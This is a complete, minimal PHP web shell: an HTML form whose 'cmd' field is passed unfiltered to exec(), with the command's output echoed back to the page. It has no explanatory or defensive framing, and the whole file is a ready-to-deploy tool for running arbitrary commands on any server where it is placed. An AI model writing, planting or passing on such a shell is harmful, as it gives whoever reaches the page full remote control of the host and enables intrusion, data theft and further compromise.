<!DOCTYPE html>
<html>
<body>

<form method="post">
  Cmd:
  <input type="text" id="cmd" name="cmd" value="<?php if (isset($_POST['cmd'])) echo htmlspecialchars($_POST['cmd']); ?>" autofocus/>
  <input type="Submit" name="submit_button" value="Run"/>
</form>

<?php
  if (isset($_POST["cmd"])) {
    exec($_POST["cmd"]." 2>&1", $output);

	foreach ($output as $line) {
      echo $line."<br>";
    }
  }
?>

</body>
</html>
